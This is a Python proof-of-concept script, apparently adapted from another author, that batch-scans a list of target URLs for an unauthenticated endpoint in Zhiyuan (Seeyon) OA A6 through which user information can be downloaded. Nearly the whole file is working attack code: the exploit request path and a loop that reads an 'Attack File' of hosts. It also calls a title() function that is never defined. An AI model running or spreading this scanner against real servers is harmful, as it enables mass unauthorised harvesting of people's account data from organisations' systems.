#修改peiqi师傅
import requests
import sys
import random
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning

"""
致远OA办公自动化软件用于OA办公自动化软件的开发销售
漏洞介绍：致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息
漏洞影响：致远OA A6
poc: url/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
"""


def POC_1(target_url):
    vuln_url = target_url + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "@" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞,下载地址:{} \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)
